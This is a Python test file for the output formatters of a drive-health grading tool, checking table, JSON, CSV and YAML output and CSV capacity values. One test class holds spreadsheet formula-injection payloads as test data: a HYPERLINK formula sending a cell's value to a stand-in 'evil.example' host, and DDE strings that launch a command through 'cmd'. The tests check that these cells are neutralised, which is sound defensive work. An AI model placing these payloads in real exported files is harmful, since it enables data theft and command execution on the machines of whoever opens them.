#
# Copyright (c) 2026 Circular Drive Initiative.
#
# This file is part of CDI Health.
# See https://github.com/circulardrives/cdi-grading-tool/ for further info.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

"""Tests for output formatters."""

from __future__ import annotations

import csv
import io
import json

import pytest

from cdi_health.classes.formatter import CSVFormatter, JSONFormatter, TableFormatter, YAMLFormatter


class TestTableFormatter:
    """Test TableFormatter."""

    def test_format_empty_devices(self) -> None:
        """Test formatting empty device list."""
        formatter = TableFormatter()
        result = formatter.format([])
        assert "No devices found" in result

    def test_format_single_device(self, sample_nvme_device: dict) -> None:
        """Test formatting single device."""
        formatter = TableFormatter(show_header=False, show_alerts=False)
        result = formatter.format([sample_nvme_device])
        assert isinstance(result, str)
        assert len(result) > 0

    def test_format_multiple_devices(self, sample_nvme_device: dict, sample_ata_device: dict) -> None:
        """Test formatting multiple devices."""
        formatter = TableFormatter(show_header=False, show_alerts=False)
        result = formatter.format([sample_nvme_device, sample_ata_device])
        assert isinstance(result, str)
        assert len(result) > 0


class TestJSONFormatter:
    """Test JSONFormatter."""

    def test_format_empty_devices(self) -> None:
        """Test formatting empty device list."""
        formatter = JSONFormatter()
        result = formatter.format([])
        data = json.loads(result)
        assert isinstance(data, list)
        assert len(data) == 0

    def test_format_single_device(self, sample_nvme_device: dict) -> None:
        """Test formatting single device."""
        formatter = JSONFormatter()
        result = formatter.format([sample_nvme_device])
        data = json.loads(result)
        assert isinstance(data, list)
        assert len(data) == 1

    def test_format_valid_json(self, sample_nvme_device: dict) -> None:
        """Test that output is valid JSON."""
        formatter = JSONFormatter()
        result = formatter.format([sample_nvme_device])
        # Should not raise exception
        json.loads(result)


class TestCSVFormatter:
    """Test CSVFormatter."""

    def test_format_empty_devices(self) -> None:
        """Test formatting empty device list."""
        formatter = CSVFormatter()
        result = formatter.format([])
        lines = result.strip().split("\n")
        # Should have header at minimum
        assert len(lines) >= 1

    def test_format_single_device(self, sample_nvme_device: dict) -> None:
        """Test formatting single device."""
        formatter = CSVFormatter()
        result = formatter.format([sample_nvme_device])
        lines = result.strip().split("\n")
        # Should have header + at least one data row
        assert len(lines) >= 2

    @staticmethod
    def _capacity_cells(text: str) -> list[str]:
        return [row["capacity"] for row in csv.DictReader(io.StringIO(text))]

    def test_capacity_is_filled_from_bytes(self) -> None:
        """#167: scans report the size as ``bytes``; the column was always blank."""
        devices = [
            {"dut": "/dev/sda", "serial_number": "S1", "transport_protocol": "ATA", "bytes": 960197124096},
            {"dut": "/dev/sdb", "serial_number": "S2", "transport_protocol": "ATA", "bytes": 1920383410176},
        ]
        result = CSVFormatter().format(devices)
        assert self._capacity_cells(result) == ["960 GB", "1.92 TB"]

    def test_capacity_matches_the_table(self) -> None:
        """The CSV and the table show the same size for the same drive."""
        device = {"dut": "/dev/sda", "serial_number": "S1", "transport_protocol": "ATA", "bytes": 4000787030016}
        csv_value = self._capacity_cells(CSVFormatter().format([device]))[0]
        assert csv_value == TableFormatter()._get_display_value(device, "capacity")

    def test_capacity_blank_when_size_unknown(self) -> None:
        """An unreported size is an empty cell, not a placeholder."""
        device = {"dut": "/dev/sda", "serial_number": "S1", "transport_protocol": "ATA"}
        assert self._capacity_cells(CSVFormatter().format([device])) == [""]

    def test_capacity_filled_without_rescoring(self) -> None:
        """The API's saved-scan export (include_scores=False) fills it too."""
        device = {"dut": "/dev/nvme0", "serial_number": "N1", "health_grade": "A", "bytes": 7681501126656}
        result = CSVFormatter(include_scores=False).format([device])
        assert self._capacity_cells(result) == ["7.68 TB"]


class TestCsvFormulaCells:
    """Drive strings come from firmware; a spreadsheet must never run one as a formula."""

    HOSTILE = {
        "dut": "/dev/sda",
        "transport_protocol": "ATA",
        "model_number": '=HYPERLINK("http://evil.example/?x="&A1,"click")',
        "serial_number": "@SUM(1+1)*cmd|' /C calc'!A0",
        "smart_status": "+1+1",
        "warning_flags": ["-2+3", "DUPLICATE_SERIAL"],
    }

    def test_scan_csv_neutralises_formula_cells(self) -> None:
        row = next(csv.DictReader(io.StringIO(CSVFormatter(include_scores=False).format([self.HOSTILE]))))
        assert row["model_number"] == "'" + self.HOSTILE["model_number"]
        assert row["serial_number"] == "'" + self.HOSTILE["serial_number"]
        assert row["smart_status"] == "'+1+1"
        assert row["warning_flags"] == "'-2+3 | DUPLICATE_SERIAL"

    @pytest.mark.parametrize("value", ["-5", "+3", "42", "-0.5", "960 GB", "WD-WMC3T0123456", "/dev/sda", "A", ""])
    def test_ordinary_values_are_untouched(self, value: str) -> None:
        from cdi_health.classes.revert import csv_safe

        assert csv_safe(value) == value

    @pytest.mark.parametrize(
        "value", ["=1+1", "+1+1", "-2+3", "@SUM(A1)", "\t=1+1", "\r=1+1", "-", "=cmd|' /C calc'!A0"]
    )
    def test_formula_like_values_are_quoted(self, value: str) -> None:
        from cdi_health.classes.revert import csv_safe

        assert csv_safe(value) == "'" + value

    def test_report_csv_neutralises_formula_cells(self, tmp_path) -> None:
        from cdi_health.classes.reporter import ReportGenerator

        device = {
            **self.HOSTILE,
            "media_type": "HDD",
            "firmware_revision": "-2+3",
            "vendor": "+1+1",
        }
        out = tmp_path / "report.csv"
        ReportGenerator().generate_csv([device], str(out))
        with out.open(encoding="utf-8-sig", newline="") as handle:
            rows = list(csv.reader(handle))
        cells = [cell for row in rows[1:] for cell in row]
        assert "'" + self.HOSTILE["model_number"] in cells
        assert not [cell for cell in cells if cell[:1] in ("=", "+", "@") or (cell[:1] == "-" and cell != "-5")]


class TestYAMLFormatter:
    """Test YAMLFormatter."""

    def test_format_empty_devices(self) -> None:
        """Test formatting empty device list."""
        formatter = YAMLFormatter()
        result = formatter.format([])
        assert isinstance(result, str)
        # Empty list should produce valid YAML
        assert result.strip() == "[]" or result.strip().startswith("-")

    def test_format_single_device(self, sample_nvme_device: dict) -> None:
        """Test formatting single device."""
        formatter = YAMLFormatter()
        result = formatter.format([sample_nvme_device])
        assert isinstance(result, str)
        assert len(result) > 0
